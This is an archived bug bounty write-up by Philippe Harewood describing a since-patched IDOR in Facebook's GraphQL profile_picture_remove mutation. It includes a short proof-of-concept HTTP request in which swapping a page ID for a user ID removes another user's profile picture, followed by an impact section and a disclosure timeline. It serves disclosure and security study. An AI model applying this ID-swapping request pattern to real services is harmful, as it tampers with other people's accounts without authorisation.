---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-19_removing-profile-pictures-for-any-facebook-user.md
original_filename: 2019-08-19_removing-profile-pictures-for-any-facebook-user.md
title: Removing profile pictures for any Facebook user
category: documents
detected_topics:
- sso
- idor
- command-injection
- otp
- graphql
tags:
- imported
- documents
- sso
- idor
- command-injection
- otp
- graphql
language: en
raw_sha256: 86955605856038a61f0908f06d1204f06caf9296e5d02bc0fd0fea2e2584c489
text_sha256: 3cc1ee30929953251ef10af0c76138c69a5ee43363036817acdf5ea91cecca00
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Removing profile pictures for any Facebook user

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-19_removing-profile-pictures-for-any-facebook-user.md
- Source Type: markdown
- Detected Topics: sso, idor, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `86955605856038a61f0908f06d1204f06caf9296e5d02bc0fd0fea2e2584c489`
- Text SHA256: `3cc1ee30929953251ef10af0c76138c69a5ee43363036817acdf5ea91cecca00`


## Content

---
title: "Removing profile pictures for any Facebook user"
page_title: "Removing profile pictures for any Facebook user - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/removing-profile-pictures-for-any-facebook-user/"
final_url: "https://philippeharewood.com/removing-profile-pictures-for-any-facebook-user/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
bounty: "2,500"
publication_date: "2019-08-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5076
---

Posted on [July 13, 2019](https://philippeharewood.com/removing-profile-pictures-for-any-facebook-user/)

# Removing profile pictures for any Facebook user

In the fifth major Facebook update (known as [FB5](https://developers.facebook.com/videos/2019/building-the-new-facebookcom-with-react-graphql-and-relay/)), Facebook introduced a [GraphQL](https://facebook.com/notes/phwd/a-facebook-graphql-crash-course/1189337427822946/) call for removing a profile picture of a Facebook fan page. 

The `profile_picture_remove` mutator is the name of the GraphQL call for this specific mutation. Normally, the mutation accepts a page identifier in the `profile_id` field for a Facebook page. Changing the identifier for any user profile allowed a malicious user to dissociate the user’s profile picture.

**Proof of concept**

`POST /graphql?access_token=EAA...ZDZD HTTP/1.1  
Host: graph.facebook.com  
  
q=Mutation a:b {profile_picture_remove(<input>){client_mutation_id}}  
query_params={input:{profile_id:1,client_mutation_id:0,actor_id:2}}`

The result would remove the current photo as the profile picture leaving the default Facebook profile picture in its place.

![](https://philippeharewood.com/wp-content/uploads/2019/08/blank.jpeg)

**Impact**

An issue was identified which would have let a malicious user remove the profile picture association for another user. One thing to note is that the original photo was still available, so a user is able to set the profile picture back to the original.

**Timeline**

Jul 13, 2019 7:21 AM – Report sent  
Jul 13, 2019 10:59 AM – Confirmation of submission by Facebook  
Jul 14, 2019 4:39 PM – Confirmation of patch by Facebook  
Jul 24, 2019 – $2500 Bounty awarded by Facebook
